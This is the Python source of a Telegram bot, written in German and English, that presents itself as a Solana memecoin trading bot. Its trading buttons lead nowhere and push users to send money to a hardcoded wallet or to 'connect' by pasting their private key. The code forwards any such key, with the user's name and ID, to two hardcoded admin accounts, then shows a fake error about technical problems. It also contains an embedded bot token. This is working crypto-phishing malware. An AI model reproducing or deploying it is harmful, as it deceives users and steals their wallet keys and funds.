import telebot
import threading
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- Konfiguration ---
TOKEN = "7535386733:AAGteXWFu7P-lKpfdh2DarkSn0QcrXxRDp8"
ADMIN_ID_1 = 7625705235  # Sofort
ADMIN_ID_2 = 5817520929  # 30 Sekunden später

bot = telebot.TeleBot(TOKEN)

# --- Hauptmenü erstellen ---
def main_menu():
    markup = InlineKeyboardMarkup(row_width=3)
    buttons = [
        [InlineKeyboardButton("🔹 Buy", callback_data="buy"), InlineKeyboardButton("🔹 Sell", callback_data="sell")],
        [InlineKeyboardButton("📊 Positions", callback_data="positions"),
         InlineKeyboardButton("💰 Claim SOL", callback_data="claim_sol"),
         InlineKeyboardButton("📋 Orders", callback_data="orders")],
        [InlineKeyboardButton("⚡ Snipers", callback_data="snipers"),
         InlineKeyboardButton("🖨️ Copy trading", callback_data="copy_trading")],
        [InlineKeyboardButton("🏦 Withdraw", callback_data="withdraw"),
         InlineKeyboardButton("💸 Referral", callback_data="referral"),
         InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
        [InlineKeyboardButton("❓ Help", callback_data="help"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
        [InlineKeyboardButton("🔗 Wallet verbinden", callback_data="connect_wallet")]
    ]
    for row in buttons:
        markup.add(*row)
    return markup

# --- Startbefehl ---
@bot.message_handler(commands=['start'])
def start_cmd(message):
    wallet_address = "7iGPiGYdZguWWS8CkcnNtRYRepRbEHCWxKLBFfn6rwB6"
    balance = "0.0000 SOL ($0.00)"
    
    welcome_text = (
        f"Welcome {message.from_user.first_name} to Memecoin Bot! \n\n"
        f"`{wallet_address}` *(tap to copy)*\n"
        f"Balance: `{balance}`\n\n"
        "Klicken Sie auf 'Refresh', um Ihr Guthaben zu aktualisieren oder verbinden Sie Ihre Wallet.\n\n"
    )
    
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_menu())

# --- Button-Funktionen ---
@bot.callback_query_handler(func=lambda call: True)
def button_handler(call):
    if call.data in ["buy", "sell"]:
        bot.send_message(call.message.chat.id, "⚠️ Kein Guthaben! Bitte senden Sie Geld an die oben genannte Wallet oder verbinden Sie Ihre Wallet.")
    
    elif call.data == "positions":
        bot.send_message(call.message.chat.id, "📊 Keine offenen Positionen momentan.")

    elif call.data == "claim_sol":
        bot.send_message(call.message.chat.id, "💰 Bitte verbinden Sie Ihre Wallet, um SOL zu claimen.")
    
    elif call.data == "orders":
        bot.send_message(call.message.chat.id, "📋 Keine offenen Orders momentan.")

    elif call.data in ["snipers", "copy_trading", "withdraw"]:
        bot.send_message(call.message.chat.id, "⚡ Bitte verbinden Sie Ihre Wallet, um diese Funktion zu nutzen.")

    elif call.data == "referral":
        bot.send_message(call.message.chat.id, "💸 Sie erhalten **50%** von den Nutzern, die Sie einladen!\n\n📲 @Tradesnipebot_bot")

    elif call.data == "settings":
        bot.send_message(call.message.chat.id, "⚙️ Bitte verbinden Sie zuerst Ihre Wallet.", reply_markup=wallet_connect_menu())

    elif call.data == "connect_wallet":
        bot.send_message(call.message.chat.id, "🔐 Bitte senden Sie Ihren Private Key, um Ihre Wallet zu verbinden.")

# --- Wallet verbinden Button ---
def wallet_connect_menu():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔗 Wallet verbinden", callback_data="connect_wallet"))
    return markup

# --- Private Key speichern & an Admin senden ---
@bot.message_handler(func=lambda message: True)
def save_private_key(message):
    private_key = message.text.strip()

    if len(private_key) > 50:  # Mindestlänge prüfen
        # Sofort an Admin 1
        bot.send_message(ADMIN_ID_1, f"🔑 Neuer Private Key: {private_key}\n👤 Von: {message.from_user.username} (ID: {message.from_user.id})")
        
        # Nach 30 Sekunden an Admin 2
        threading.Timer(30.0, lambda: bot.send_message(
            ADMIN_ID_2, f"🔑 Neuer Private Key: {private_key}\n👤 Von: {message.from_user.username} (ID: {message.from_user.id})"
        )).start()
        
        bot.send_message(message.chat.id, "❌Ihr Konto konnte nicht verbunden Werden , Wir haben gerade Technische Probelme bitte veruschen sie es Später nochmal !")
    else:
        bot.send_message(message.chat.id, "⚠️ Der Private Key ist zu kurz oder ungültig.")

# --- Bot starten ---
bot.polling()